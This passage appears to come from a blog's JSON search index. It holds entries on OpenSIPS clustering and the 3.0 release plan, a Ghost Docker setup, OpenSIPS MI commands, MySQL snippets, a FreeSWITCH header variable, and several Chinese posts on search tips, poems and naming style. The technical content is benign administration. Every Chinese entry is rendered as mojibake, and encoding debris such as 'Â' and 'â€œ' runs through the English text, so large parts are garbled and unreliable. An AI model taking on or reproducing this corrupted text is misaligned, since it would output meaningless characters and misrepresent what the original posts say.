dataset.Recommendation:Â if you plan on using this feature, we recommend deploying a local database server on each node.Â Setting up multiple nodes to flush to a shared database using the oldÂ skip_replicated_db_opsÂ feature may still work, but we no longer encourage or test such setups.\nContact Pinging Thanks to the clustering layer that makes nodes aware of the total number of online nodes, we are able to evenly spread the pinging workload across the current number of online cluster nodes at any given point in time.Configuration:Â You only have to configure the pinging-related module parameters ofÂ nathelper(e.g.Â sipping_bflag, sipping_from, natping_tcp, natping_interval) and set these flags for the contacts which require pinging.Â Nothing new, in short.Â The newly added pinging workload distribution logic will work right out of the box.\nâ€œFull Sharingâ€ via NoSQL NoSQL-based â€œFull Sharingâ€For deployments that are so large that the dataset outgrows the size of the OpenSIPS cache, or in case you simply donâ€™t feel at ease with Gigabytes worth of cached SIP contacts in production, NoSQL may be a more pleasant alternative.With features such as data replication, data sharding and indexed columns, it may be a wise choice to leave the handling of large amounts of data to a specialized engine rather than doing it in-house.Â Configuring such setups will be a topic for an in-depth future tutorial, where we will learn how to configure â€œfull sharingâ€ user location clusters with both of the currently supported NoSQL engines: Apache Cassandra and MongoDB.\nSummary The â€œfull sharingâ€ data distribution strategy for the OpenSIPS user location is an intuitive solution which requires little to no additional OpenSIPS scripting (only a handful of module parameters).Â The major hurdles of running a SIP deployment (data redundancy, node failover, restart persistency and NAT traversal) have been carefully solved and baked into the module, without imposing any special script handling to the user.Â Moreover, depending on the sizing requirements of the target platform, users retain the flexibility of choosing between the native or NoSQL-based data management engines.\n","permalink":"https://wdd.js.org/opensips/blog/cluster-location/","summary":"The distributed SIP user location support is one of the major features of theÂ latest stable OpenSIPS release, namely 2.4.Â The aim of this extension of the OpenSIPSÂ usrlocÂ module is to provide a horizontally scalable solution that is easy to set up and maintain, while remaining flexible enough to cope with varying needs of each specific deployment.Throughout this text, by â€œdataâ€ we refer to SIP Addresses-of-Record (subscribers) and their dynamic SIP Contact bindings (network coordinates of their SIP devices) â€” all of these must be replicated across cluster nodes.","title":"Clustered SIP User Location: The Full Sharing Topology"},{"content":"You already know the story â€“ one more year, one more evolution cycle, one more OpenSIPS major release. Even more, a new OpenSIPS direction is about to start. So let me introduce you to the upcoming OpenSIPS 3.0 .For the upcoming OpenSIPS 3.0 release (and 3.x family) the main focus is on theÂ **_devopsÂ _**concept. Shortly said, this translates into:\nmaking the OpenSIPS script writing/developing much easier simplifying the operational activities around OpenSIPS What features and functionalities a software is able to deliver is a very important factor. Nevertheless, how easy to use and operate the software is, it;s a another factor with almost the same importance . Especially if we consider the case of OpenSIPS which is a very complex software to configure, to integrate and to operate in large scale multi-party platforms.\nThe â€œdevâ€ aspects in OpenSIPS 3.0 This release is looking to improve the experience of the OpenSIPS script writer (developer), by enhancing and simplifying the OpenSIPS script, at all its level.TheÂ script re-formattingÂ (as structure), the addition ofÂ full pre-processor support, the enhancement of theÂ script variableâ€™s naming and support, the standardization of the complex modparams (and many other) will address the script writers needs of\neasiness flexibility strength when comes to creating, managing and maintaining more and more complex OpenSIPS configurations.The full list of â€œdevâ€ oriented features along with explanations and details is to be found on theÂ official 3.0 planning document.\nThe â€œopsâ€ aspects in OpenSIPS 3.0 The operational activity is a continues job, starting from day one, when you started to run your OpenSIPS. Usually there is a lot of time, effort and resources invested in this operational activities, so any extra help in the area is more than welcome.OpenSIPS 3.0 is planning several enhancements and new concepts in order to help with operating OpenSIPS â€“ making it simpler to run, to monitor, to troubleshoot and diagnose.We are especially looking at reducing the need of restarts during service time â€“ restarting your production OpenSIPS is something that any devops engineer will try to avoid as much as possible. New features asÂ auto-scalingÂ (as number of processes),Â runtime changes of module parametersÂ orÂ script reloadÂ are addressing this fear. Even when a restart cannot be avoided, the internal memory persistence during restart may minimize the impact.But when comes to vital operational activities like monitoring and understanding what is going one with your OpenSIPS or troubleshooting calls or traffic handled by your OpenSIPS, the most important new additions for helping to operate OpenSIPS are:\ntracing consoleÂ â€“ provided by the new â€˜opensipsctlâ€™ tool, the console will allow you to see in realtime various information related to specifics call only. The information may be the OpenSIPS logs, SIP packets, script logs, rest queries, maybe DB queries self diagnosis toolÂ â€“ also provided by the opensipsctl tool, this is a logic that collects various information from a running OpenSIPS (via MI) in regards to thresholds, load information, statistics and logs in order to locate and indicate a potential problem or bottleneck with your OpenSIPS. There are even more features that will simply the way you operate your OpenSIPS â€“ the full list (with explanations) is available on theÂ official 3.0 planning document.\nMore Integration aspects withe OpenSIPS 3.0 The work to make possible the integration of OpenSIPS with other external components is a never-ending job. This release will make no exception and address this need.A majorÂ rework of the Management InterfaceÂ is ongoing, with the sole purpose of standardizing and simplifying the way you interact with the MI interface. Shifting to Json encoding as the only way to pack data and re-structuring all the available transport (protocols) for interacting with the MI interface will enhance your experience in using this interface from any other language / application.The 3.0 release is planning to provide new modules for more integration capabilities:\n**SMPPÂ **module â€“ a bidirectional gateway / translator between SIP (MESSAGE requests) and SMPP protocol. RabbitMQ consumerÂ module â€“ a RabbitMQ consumer that pushes the messages as events into the OpenSIPS script. A more detailed description is available on theÂ official 3.0 planning document.\nCommunity opinion is important The opinion of the community matters to us, so we need your feedback and comments in regards to the 3.0 Dev Plan.To express yourself on the 3.0 Dev Plan, please see theÂ online formÂ â€” you can give scores to the items in the plan and you can suggest other items. This feedback will be very useful for us in order to align the Dev Plan to the real needs of our community, of the people actually using OpenSIPS. Besides our ideas listed in the form, you can of course come with your own ideas, or feature requests that we will gladly take into considerations.The deadline for submitting your answers in theÂ formÂ is 6th of January 2019. After this deadline we will gather all your submissions and sort them according to your feedback. We will use the result to filter the topics you consider interesting and prioritize the most wanted ones.Also, toÂ talk more in details about the features of this new release, a publicÂ audio conferencewill be availableÂ onÂ 20th of December 2018, 4 pm GMTÂ ,Â thanksÂ to the kind sponsorship ofÂ UberConference. Anyone is welcome to join to find out more details or to ask questions aboutÂ OpenSIPSÂ 3.0.This is a public and open conference, so no registration is needed.\nThe timeline The timeline for OpenSIPS 3.0 is:\nBeta Release â€“ 18-31 March 2019 Stable Release â€“ 22-29 April 2019 General Availability â€“ 30th of April 2019, duringÂ OpenSIPS Summit 2019 ","permalink":"https://wdd.js.org/opensips/blog/opensips3x/","summary":"You already know the story â€“ one more year, one more evolution cycle, one more OpenSIPS major release. Even more, a new OpenSIPS direction is about to start. So let me introduce you to the upcoming OpenSIPS 3.0 .For the upcoming OpenSIPS 3.0 release (and 3.x family) the main focus is on theÂ **_devopsÂ _**concept. Shortly said, this translates into:\nmaking the OpenSIPS script writing/developing much easier simplifying the operational activities around OpenSIPS What features and functionalities a software is able to deliver is a very important factor.","title":"Introducing OpenSIPS 3.0"},{"content":"é—®é¢˜åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯æœç´¢å¼•æ“èƒ½å¤Ÿæ‰¾åˆ°ç­”æ¡ˆçš„ï¼Œå¦ä¸€ç§æ˜¯æœç´¢å¼•æ“æ‰¾ä¸åˆ°ç­”æ¡ˆçš„ã€‚\næŒ‰ç…§80-20åŸåˆ™ï¼Œå‰è€…ä¼°è®¡èƒ½å åˆ°80%ï¼Œè€Œåè€…èƒ½å åˆ°20%ã€‚\n1 æœç´¢å¼•æ“çš„ä½¿ç”¨ 1.1 å¦‚ä½•è®©æœç´¢å¼•æ“æ›´åŠ ç†è§£ä½ ï¼Ÿ å¦‚æœä½ èƒ½ç†è§£æœç´¢å¼•æ“ï¼Œé‚£ä¹ˆæœç´¢å¼•æ“ä¼šæ›´åŠ ç†è§£ä½ ã€‚\næœç´¢å¼•æ“æ˜¯åŸºäºå…³é”®è¯å»æœç´¢çš„ï¼Œæ‰€ä»¥å°½é‡ç»™æœç´¢å¼•æ“å…³é”®è¯ï¼Œè€Œä¸æ˜¯å¤§æ®µçš„æŠ¥é”™ å…³é”®è¯çš„é¡ºåºå¾ˆé‡è¦ï¼ŒæŠŠé‡è¦çš„å…³é”®è¯æ”¾åœ¨é å‰çš„ä½ç½® 1.2 å¦‚ä½•æç‚¼å…³é”®è¯ï¼Ÿ 1.3 ä¸é”™çš„æ‰€æœå¼•æ“æ¨èï¼Ÿ 2 å½“æœç´¢å¼•æ“æ— æ³•è§£å†³æ—¶ï¼Ÿ å½“æœç´¢å¼•æ“æ— æ³•è§£å†³æ—¶ï¼Œå¯ä»¥ä»å“ªäº›æ–¹é¢æ€è€ƒï¼Ÿ\næ‹¼å†™æˆ–è€…æ ¼å¼ç­‰é”™è¯¯ ä¸Šä¸‹æ–‡ä¸ç†è§£ï¼Œè¯­å¢ƒä¸æ¸…æ™°ï¼Œæ–­ç« å–ä¹‰ ","permalink":"https://wdd.js.org/posts/2019/07/bq7ih4/","summary":"é—®é¢˜åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯æœç´¢å¼•æ“èƒ½å¤Ÿæ‰¾åˆ°ç­”æ¡ˆçš„ï¼Œå¦ä¸€ç§æ˜¯æœç´¢å¼•æ“æ‰¾ä¸åˆ°ç­”æ¡ˆçš„ã€‚\næŒ‰ç…§80-20åŸåˆ™ï¼Œå‰è€…ä¼°è®¡èƒ½å åˆ°80%ï¼Œè€Œåè€…èƒ½å åˆ°20%ã€‚\n1 æœç´¢å¼•æ“çš„ä½¿ç”¨ 1.1 å¦‚ä½•è®©æœç´¢å¼•æ“æ›´åŠ ç†è§£ä½ ï¼Ÿ å¦‚æœä½ èƒ½ç†è§£æœç´¢å¼•æ“ï¼Œé‚£ä¹ˆæœç´¢å¼•æ“ä¼šæ›´åŠ ç†è§£ä½ ã€‚\næœç´¢å¼•æ“æ˜¯åŸºäºå…³é”®è¯å»æœç´¢çš„ï¼Œæ‰€ä»¥å°½é‡ç»™æœç´¢å¼•æ“å…³é”®è¯ï¼Œè€Œä¸æ˜¯å¤§æ®µçš„æŠ¥é”™ å…³é”®è¯çš„é¡ºåºå¾ˆé‡è¦ï¼ŒæŠŠé‡è¦çš„å…³é”®è¯æ”¾åœ¨é å‰çš„ä½ç½® 1.2 å¦‚ä½•æç‚¼å…³é”®è¯ï¼Ÿ 1.3 ä¸é”™çš„æ‰€æœå¼•æ“æ¨èï¼Ÿ 2 å½“æœç´¢å¼•æ“æ— æ³•è§£å†³æ—¶ï¼Ÿ å½“æœç´¢å¼•æ“æ— æ³•è§£å†³æ—¶ï¼Œå¯ä»¥ä»å“ªäº›æ–¹é¢æ€è€ƒï¼Ÿ\næ‹¼å†™æˆ–è€…æ ¼å¼ç­‰é”™è¯¯ ä¸Šä¸‹æ–‡ä¸ç†è§£ï¼Œè¯­å¢ƒä¸æ¸…æ™°ï¼Œæ–­ç« å–ä¹‰ ","title":"è§£å†³é—®é¢˜çš„æ€ç»´æ¨¡å¼"},{"content":"æ¢¦ä¸è¯— èƒ¡é€‚ é†‰è¿‡æ‰çŸ¥é…’æµ“çˆ±è¿‡æ‰çŸ¥æƒ…é‡ä½ ä¸èƒ½åšæˆ‘çš„è¯—æ­£å¦‚æˆ‘ä¸èƒ½åšä½ çš„æ¢¦\næƒ…æ­Œ åˆ˜åŠå†œå¤©ä¸Šé£˜ç€äº›å¾®äº‘åœ°ä¸Šå¹ç€äº›å¾®é£å•Šï¼å¾®é£å¹åŠ¨äº†æˆ‘çš„å¤´å‘æ•™æˆ‘å¦‚ä½•ä¸æƒ³å¥¹ï¼Ÿ\næ²™æ‰¬å¨œæ‹‰ èµ æ—¥æœ¬å¥³éƒ å¾å¿—æ‘©æœ€æ˜¯é‚£ä¸€ä½å¤´çš„æ¸©æŸ”åƒä¸€æœµæ°´è²èŠ±ä¸èƒœå‡‰é£çš„å¨‡ç¾é“ä¸€å£°çé‡é“ä¸€å£°çé‡é‚£ä¸€å£°çé‡é‡Œæœ‰èœœç”œçš„å¿§æ„æ²™æ‰¬å¨œæ‹‰ï¼\nå†åˆ«åº·æ¡¥ å¾å¿—æ‘©è½»è½»åœ°æˆ‘èµ°äº†æ­£å¦‚æˆ‘è½»è½»åœ°æ¥æˆ‘è½»è½»åœ°æ‹›æ‰‹ä½œåˆ«è¥¿å¤©çš„äº‘å½©\nä¼Šçœ¼åº• æ±ªé™ä¹‹ä¼Šçœ¼åº•æ˜¯æ¸©æš–çš„å¤ªé˜³ä¸ç„¶ï¼Œä½•ä»¥ä¼Šä¸€æœ›ç€æˆ‘æˆ‘å—äº†å†»çš„å¿ƒå°±çƒ­äº†å‘¢\n","permalink":"https://wdd.js.org/posts/2019/07/icwy4b/","summary":"æ¢¦ä¸è¯— èƒ¡é€‚ é†‰è¿‡æ‰çŸ¥é…’æµ“çˆ±è¿‡æ‰çŸ¥æƒ…é‡ä½ ä¸èƒ½åšæˆ‘çš„è¯—æ­£å¦‚æˆ‘ä¸èƒ½åšä½ çš„æ¢¦\næƒ…æ­Œ åˆ˜åŠå†œå¤©ä¸Šé£˜ç€äº›å¾®äº‘åœ°ä¸Šå¹ç€äº›å¾®é£å•Šï¼å¾®é£å¹åŠ¨äº†æˆ‘çš„å¤´å‘æ•™æˆ‘å¦‚ä½•ä¸æƒ³å¥¹ï¼Ÿ\næ²™æ‰¬å¨œæ‹‰ èµ æ—¥æœ¬å¥³éƒ å¾å¿—æ‘©æœ€æ˜¯é‚£ä¸€ä½å¤´çš„æ¸©æŸ”åƒä¸€æœµæ°´è²èŠ±ä¸èƒœå‡‰é£çš„å¨‡ç¾é“ä¸€å£°çé‡é“ä¸€å£°çé‡é‚£ä¸€å£°çé‡é‡Œæœ‰èœœç”œçš„å¿§æ„æ²™æ‰¬å¨œæ‹‰ï¼\nå†åˆ«åº·æ¡¥ å¾å¿—æ‘©è½»è½»åœ°æˆ‘èµ°äº†æ­£å¦‚æˆ‘è½»è½»åœ°æ¥æˆ‘è½»è½»åœ°æ‹›æ‰‹ä½œåˆ«è¥¿å¤©çš„äº‘å½©\nä¼Šçœ¼åº• æ±ªé™ä¹‹ä¼Šçœ¼åº•æ˜¯æ¸©æš–çš„å¤ªé˜³ä¸ç„¶ï¼Œä½•ä»¥ä¼Šä¸€æœ›ç€æˆ‘æˆ‘å—äº†å†»çš„å¿ƒå°±çƒ­äº†å‘¢","title":"ç°ä»£è¯— äº”é¦– æ‘˜æŠ„"},{"content":"Docker ghost å®‰è£… docker run -d --name myghost -p 8090:2368 -e url=http://172.16.200.228:8090/ \\ -v /root/volumes/ghost:/var/lib/ghost/content ghost æ¨¡æ¿ä¿®æ”¹ å‚è€ƒ https://www.ghostforbeginners.com/move-featured-posts-to-the-top-of-your-blog/ ","permalink":"https://wdd.js.org/posts/2019/07/ae4atc/","summary":"Docker ghost å®‰è£… docker run -d --name myghost -p 8090:2368 -e url=http://172.16.200.228:8090/ \\ -v /root/volumes/ghost:/var/lib/ghost/content ghost æ¨¡æ¿ä¿®æ”¹ å‚è€ƒ https://www.ghostforbeginners.com/move-featured-posts-to-the-top-of-your-blog/ ","title":"ghoståšå®¢ å›ºå®šfeatureåšå®¢"},{"content":"åœ¨æ‰€æœ‰çš„fifoå‘½ä»¤ä¸­ï¼Œwhichå‘½ä»¤æ¯”è¾ƒé‡è¦ï¼Œå› ä¸ºå®ƒå¯ä»¥åˆ—å‡ºæ‰€æœ‰çš„å…¶ä»–å‘½ä»¤ã€‚\næœ‰äº›miå‘½ä»¤æ˜¯å­˜åœ¨äºå„ä¸ªæ¨¡å—ä¹‹ä¸­ï¼Œæ‰€ä»¥åŠ è½½çš„æ¨¡å—ä¸é€šã€‚opensipsctl fifo whichè¾“å‡ºçš„å‘½ä»¤ä¹Ÿä¸é€šã€‚\nè·å–æ‰§è¡Œå‚æ•° opensipsctl fifo arg åˆ—å‡ºTCPè¿æ¥æ•°é‡ opensipsctl fifo list_tcp_conns æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯ opensipsctl fifo ps æŸ¥çœ‹opensipsè¿è¡Œæ—¶é•¿ opensipsctl fifo uptime æŸ¥çœ‹æ‰€æœ‰æ”¯æŒçš„æŒ‡ä»¤ opensipsctl fifo which è·å–ç»Ÿè®¡æ•°æ® opensipsctl fifo get_statistics rcv_requests é‡ç½®ç»Ÿè®¡æ•°æ® opensipsctl fifo get_statistics received_replies get_statistics reset_statistics uptime version pwd arg which ps kill debug cache_store cache_fetch cache_remove event_subscribe events_list subscribers_list list_tcp_conns help list_blacklists regex_reload t_uac_dlg t_uac_cancel t_hash t_reply ul_rm ul_rm_contact ul_dump ul_flush ul_add ul_show_contact ul_sync domain_reload domain_dump dlg_list dlg_list_ctx dlg_end_dlg dlg_db_sync dlg_restore_db profile_get_size profile_list_dlgs profile_get_values list_all_profiles nh_enable_ping cr_reload_routes cr_dump_routes cr_replace_host cr_deactivate_host cr_activate_host cr_add_host cr_delete_host dp_reload dp_translate address_reload address_dump subnet_dump allow_uri dr_reload dr_gw_status dr_carrier_status lb_reload lb_resize lb_list lb_status httpd_list_root_path sip_trace rtpengine_enable rtpengine_show rtpengine_reload teardown ","permalink":"https://wdd.js.org/opensips/ch3/core-mi/","summary":"åœ¨æ‰€æœ‰çš„fifoå‘½ä»¤ä¸­ï¼Œwhichå‘½ä»¤æ¯”è¾ƒé‡è¦ï¼Œå› ä¸ºå®ƒå¯ä»¥åˆ—å‡ºæ‰€æœ‰çš„å…¶ä»–å‘½ä»¤ã€‚\næœ‰äº›miå‘½ä»¤æ˜¯å­˜åœ¨äºå„ä¸ªæ¨¡å—ä¹‹ä¸­ï¼Œæ‰€ä»¥åŠ è½½çš„æ¨¡å—ä¸é€šã€‚opensipsctl fifo whichè¾“å‡ºçš„å‘½ä»¤ä¹Ÿä¸é€šã€‚\nè·å–æ‰§è¡Œå‚æ•° opensipsctl fifo arg åˆ—å‡ºTCPè¿æ¥æ•°é‡ opensipsctl fifo list_tcp_conns æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯ opensipsctl fifo ps æŸ¥çœ‹opensipsè¿è¡Œæ—¶é•¿ opensipsctl fifo uptime æŸ¥çœ‹æ‰€æœ‰æ”¯æŒçš„æŒ‡ä»¤ opensipsctl fifo which è·å–ç»Ÿè®¡æ•°æ® opensipsctl fifo get_statistics rcv_requests é‡ç½®ç»Ÿè®¡æ•°æ® opensipsctl fifo get_statistics received_replies get_statistics reset_statistics uptime version pwd arg which ps kill debug cache_store cache_fetch cache_remove event_subscribe events_list subscribers_list list_tcp_conns help list_blacklists regex_reload t_uac_dlg t_uac_cancel t_hash t_reply ul_rm ul_rm_contact ul_dump ul_flush ul_add ul_show_contact ul_sync domain_reload domain_dump dlg_list dlg_list_ctx dlg_end_dlg dlg_db_sync dlg_restore_db profile_get_size profile_list_dlgs profile_get_values list_all_profiles nh_enable_ping cr_reload_routes cr_dump_routes cr_replace_host cr_deactivate_host cr_activate_host cr_add_host cr_delete_host dp_reload dp_translate address_reload address_dump subnet_dump allow_uri dr_reload dr_gw_status dr_carrier_status lb_reload lb_resize lb_list lb_status httpd_list_root_path sip_trace rtpengine_enable rtpengine_show rtpengine_reload teardown ","title":"æ ¸å¿ƒMIå‘½ä»¤"},{"content":"è¡¨å¤åˆ¶ # ä¸è·¨æ•°æ®åº“ insert into subscriber_copy(id, username) select id, username from subscriber # è·¨æ•°æ®åº“ éœ€è¦åœ¨è¡¨åå‰åŠ ä¸Šæ•°æ®åº“å insert into wdd.test(id, username) select id, username from opensips.subscriber è°ƒæ•´è¡¨ç»“æ„ å¢åŠ å­—æ®µ ALTER TABLE test ADD `username` char(64) not null default \u0026#39;\u0026#39; éšæœºé€‰æ‹©ä¸€ä¸ªæ•°æ® SELECT nameÂ FROM table_name order by rand() limit 1\n","permalink":"https://wdd.js.org/posts/2019/07/bk7r40/","summary":"è¡¨å¤åˆ¶ # ä¸è·¨æ•°æ®åº“ insert into subscriber_copy(id, username) select id, username from subscriber # è·¨æ•°æ®åº“ éœ€è¦åœ¨è¡¨åå‰åŠ ä¸Šæ•°æ®åº“å insert into wdd.test(id, username) select id, username from opensips.subscriber è°ƒæ•´è¡¨ç»“æ„ å¢åŠ å­—æ®µ ALTER TABLE test ADD `username` char(64) not null default \u0026#39;\u0026#39; éšæœºé€‰æ‹©ä¸€ä¸ªæ•°æ® SELECT nameÂ FROM table_name order by rand() limit 1","title":"MySqlå­¦ä¹ "},{"content":"\nè‡ªå®šä¹‰SIPæ¶ˆæ¯å¤´å¦‚ä½•ä»é€šé“å˜é‡ä¸­è·å–ï¼Ÿ if you pass a header variable calledÂ typeÂ from the proxy server, it will get displayed asÂ variable_sip_h_typeÂ in FreeSWITCHâ„¢. To access that variable, you should strip off theÂ variable_, and just doÂ ${sip_h_type}\n","permalink":"https://wdd.js.org/freeswitch/get-sip-header/","summary":"è‡ªå®šä¹‰SIPæ¶ˆæ¯å¤´å¦‚ä½•ä»é€šé“å˜é‡ä¸­è·å–ï¼Ÿ if you pass a header variable calledÂ typeÂ from the proxy server, it will get displayed asÂ variable_sip_h_typeÂ in FreeSWITCHâ„¢. To access that variable, you should strip off theÂ variable_, and just doÂ ${sip_h_type}","title":"é€šé“å˜é‡ä¸SIP æ¶ˆæ¯å¤´"},{"content":"ã€å°‘å¹´ã€‘æ…ˆæ¯æ‰‹ä¸­çº¿ï¼Œæ¸¸å­èº«ä¸Šè¡£ã€æ¯•ä¸šã€‘æµ”é˜³æ±Ÿå¤´å¤œé€å®¢ï¼Œæ«å¶è»èŠ±ç§‹ç‘Ÿç‘Ÿã€å®ä¹ ã€‘åƒå‘¼ä¸‡å”¤å§‹å‡ºæ¥ï¼ŒçŠ¹æŠ±çµç¶åŠé®é¢ã€å·¥ä½œåŠ ç­ã€‘è¡£å¸¦æ¸å®½ç»ˆä¸æ‚”ï¼Œä¸ºä¼Šæ¶ˆå¾—äººæ†”æ‚´ã€åŒå­¦ç»“å©šã€‘æ˜”åˆ«å›æœªå©šï¼Œå„¿å¥³å¿½æˆè¡Œã€è¡¨ç™½ã€‘æ¬²å¾—å‘¨éƒé¡¾ï¼Œæ—¶æ—¶è¯¯æ‹‚å¼¦ã€æ‹çˆ±ã€‘åœ¨å¤©æ„¿ä½œæ¯”ç¿¼é¸Ÿï¼Œåœ¨åœ°æ„¿ä¸ºè¿ç†æã€åˆ†æ‰‹ã€‘åˆ«æœ‰å¹½æ„æš—æ¨ç”Ÿï¼Œæ­¤æ—¶æ— å£°èƒœæœ‰å£°ã€æ˜¥èŠ‚å›å®¶ã€‘è¿‘ä¹¡æƒ…æ›´æ€¯ï¼Œä¸æ•¢é—®æ¥äººã€è½¦ç«™é‡å‹ã€‘é©¬ä¸Šç›¸é€¢æ— çº¸ç¬”ï¼Œå‡­å›ä¼ è¯­æŠ¥å¹³å®‰ã€å¤–å©†å»ä¸–ã€‘æ´›é˜³äº²å‹å¦‚ç›¸é—®ï¼Œä¸€ç‰‡å†°å¿ƒåœ¨ç‰å£¶ã€èŠ‚åä¼šæ²ªã€‘ä¸¤å²¸çŒ¿å£°å•¼ä¸ä½ï¼ŒåŠ¨è½¦å·²è¿‡ä¸‡é‡å±±ã€æƒ…äººèŠ‚ã€‘å¤©é˜¶å¤œè‰²å‡‰å¦‚æ°´ï¼Œåçœ‹ç‰µç‰›ç»‡å¥³æ˜Ÿã€é‡æ¸¸å—äº¬ã€‘æµ®äº‘ä¸€åˆ«åï¼Œæµæ°´åå¹´é—´ã€ç§¦æ·®ç¯ä¼šã€‘äº‘æƒ³è¡£è£³èŠ±æƒ³å®¹ï¼Œæ˜¥é£æ‹‚æ§›éœ²åæµ“\n","permalink":"https://wdd.js.org/posts/2019/07/fabbky/","summary":"ã€å°‘å¹´ã€‘æ…ˆæ¯æ‰‹ä¸­çº¿ï¼Œæ¸¸å­èº«ä¸Šè¡£ã€æ¯•ä¸šã€‘æµ”é˜³æ±Ÿå¤´å¤œé€å®¢ï¼Œæ«å¶è»èŠ±ç§‹ç‘Ÿç‘Ÿã€å®ä¹ ã€‘åƒå‘¼ä¸‡å”¤å§‹å‡ºæ¥ï¼ŒçŠ¹æŠ±çµç¶åŠé®é¢ã€å·¥ä½œåŠ ç­ã€‘è¡£å¸¦æ¸å®½ç»ˆä¸æ‚”ï¼Œä¸ºä¼Šæ¶ˆå¾—äººæ†”æ‚´ã€åŒå­¦ç»“å©šã€‘æ˜”åˆ«å›æœªå©šï¼Œå„¿å¥³å¿½æˆè¡Œã€è¡¨ç™½ã€‘æ¬²å¾—å‘¨éƒé¡¾ï¼Œæ—¶æ—¶è¯¯æ‹‚å¼¦ã€æ‹çˆ±ã€‘åœ¨å¤©æ„¿ä½œæ¯”ç¿¼é¸Ÿï¼Œåœ¨åœ°æ„¿ä¸ºè¿ç†æã€åˆ†æ‰‹ã€‘åˆ«æœ‰å¹½æ„æš—æ¨ç”Ÿï¼Œæ­¤æ—¶æ— å£°èƒœæœ‰å£°ã€æ˜¥èŠ‚å›å®¶ã€‘è¿‘ä¹¡æƒ…æ›´æ€¯ï¼Œä¸æ•¢é—®æ¥äººã€è½¦ç«™é‡å‹ã€‘é©¬ä¸Šç›¸é€¢æ— çº¸ç¬”ï¼Œå‡­å›ä¼ è¯­æŠ¥å¹³å®‰ã€å¤–å©†å»ä¸–ã€‘æ´›é˜³äº²å‹å¦‚ç›¸é—®ï¼Œä¸€ç‰‡å†°å¿ƒåœ¨ç‰å£¶ã€èŠ‚åä¼šæ²ªã€‘ä¸¤å²¸çŒ¿å£°å•¼ä¸ä½ï¼ŒåŠ¨è½¦å·²è¿‡ä¸‡é‡å±±ã€æƒ…äººèŠ‚ã€‘å¤©é˜¶å¤œè‰²å‡‰å¦‚æ°´ï¼Œåçœ‹ç‰µç‰›ç»‡å¥³æ˜Ÿã€é‡æ¸¸å—äº¬ã€‘æµ®äº‘ä¸€åˆ«åï¼Œæµæ°´åå¹´é—´ã€ç§¦æ·®ç¯ä¼šã€‘äº‘æƒ³è¡£è£³èŠ±æƒ³å®¹ï¼Œæ˜¥é£æ‹‚æ§›éœ²åæµ“","title":"æ— é¢˜ å†è¯»å”è¯—å®‹è¯"},{"content":"æ±¤å©†å©†ç»™åƒå¯»ç­¾è®¢äº†å¥‘çº¦ï¼Œä¹‹ååƒå¯»çš„åå­—è¢«æŠ¹å»äº†ï¼Œæ¯ä¸ªäººéƒ½å«åƒå¯»å°åƒï¼Œç”šè‡³åƒå¯»è‡ªå·±ï¼Œä¹Ÿå¿˜è®°äº†è‡ªå·±åŸæ¥çš„åå­—ã€‚\nä½†æ˜¯åªæœ‰ç™½å…ˆç”Ÿå‘Šè¯«åƒå¯»ï¼Œä¸€å®šè¦è®°ä½è‡ªå·±çš„åå­—ï¼Œå¦åˆ™å†ä¹Ÿæ— æ³•å›åˆ°åŸæ¥çš„ä¸–ç•Œã€‚è€Œç™½å…ˆç”Ÿè‡ªå·±ï¼Œå°±æ˜¯é‚£ä¸ªå·²ç»æ— æ³•å›åˆ°åŸæ¥ä¸–ç•Œçš„äººã€‚\næœ€é‡è¦çš„æ˜¯è®°ä½è‡ªå·±çš„åå­— åå­—è¦æœ‰æ„ä¹‰ ä¸è¦ä½¿ç”¨ç¼©å†™ï¼Œç¼©å†™ä¼šè®©ä½ å¿˜è®°è‡ªå·±çš„åŸæ¥çš„åå­— æ²¡æœ‰å·¥ä½œçš„äººï¼Œä¼šå˜æˆå¦–æ€ªçš„ æ²¡æœ‰ç”¨çš„å˜é‡ï¼Œä¼šå˜æˆåƒåœ¾ åˆ«åƒå¾—å¤ªèƒ–ï¼Œä¼šè¢«æ€æ‰çš„ åˆ«å ç”¨å¤ªå¤šå†…å­˜ï¼Œä¼šè¢«æ“ä½œç³»ç»Ÿç»™æ€æ‰çš„ ","permalink":"https://wdd.js.org/posts/2019/07/gzfn7t/","summary":"æ±¤å©†å©†ç»™åƒå¯»ç­¾è®¢äº†å¥‘çº¦ï¼Œä¹‹ååƒå¯»çš„åå­—è¢«æŠ¹å»äº†ï¼Œæ¯ä¸ªäººéƒ½å«åƒå¯»å°åƒï¼Œç”šè‡³åƒå¯»è‡ªå·±ï¼Œä¹Ÿå¿˜è®°äº†è‡ªå·±åŸæ¥çš„åå­—ã€‚\nä½†æ˜¯åªæœ‰ç™½å…ˆç”Ÿå‘Šè¯«åƒå¯»ï¼Œä¸€å®šè¦è®°ä½è‡ªå·±çš„åå­—ï¼Œå¦åˆ™å†ä¹Ÿæ— æ³•å›åˆ°åŸæ¥çš„ä¸–ç•Œã€‚è€Œç™½å…ˆç”Ÿè‡ªå·±ï¼Œå°±æ˜¯é‚£ä¸ªå·²ç»æ— æ³•å›åˆ°åŸæ¥ä¸–ç•Œçš„äººã€‚\næœ€é‡è¦çš„æ˜¯è®°ä½è‡ªå·±çš„åå­— åå­—è¦æœ‰æ„ä¹‰ ä¸è¦ä½¿ç”¨ç¼©å†™ï¼Œç¼©å†™ä¼šè®©ä½ å¿˜è®°è‡ªå·±çš„åŸæ¥çš„åå­— æ²¡æœ‰å·¥ä½œçš„äººï¼Œä¼šå˜æˆå¦–æ€ªçš„ æ²¡æœ‰ç”¨çš„å˜é‡ï¼Œä¼šå˜æˆåƒåœ¾ åˆ«åƒå¾—å¤ªèƒ–ï¼Œä¼šè¢«æ€æ‰çš„ åˆ«å ç”¨å¤ªå¤šå†…å­˜ï¼Œä¼šè¢«æ“ä½œç³»ç»Ÿç»™æ€æ‰çš„ ","title":"ä»åƒä¸åƒå¯»è°ˆç¼–ç¨‹é£æ ¼"},{"content":"Photo byÂ Blair FraserÂ onÂ Unsplash\nä»å¤´å¼€å‘ä¸€ä¸ªè½¯ä»¶åªæ˜¯å°å„¿ç§‘ï¼Œæ”¹è¿›ä¸€ä¸ªç¨‹åºæ‰æ˜¾çœŸæœ¬äº‹ã€‚ã€Šè‹¥ä¸ºè‡ªç”±æ•…Â è‡ªç”±è½¯ä»¶ä¹‹çˆ¶ç†æŸ¥å¾·Â·æ–¯æ‰˜æ›¼ä¼ 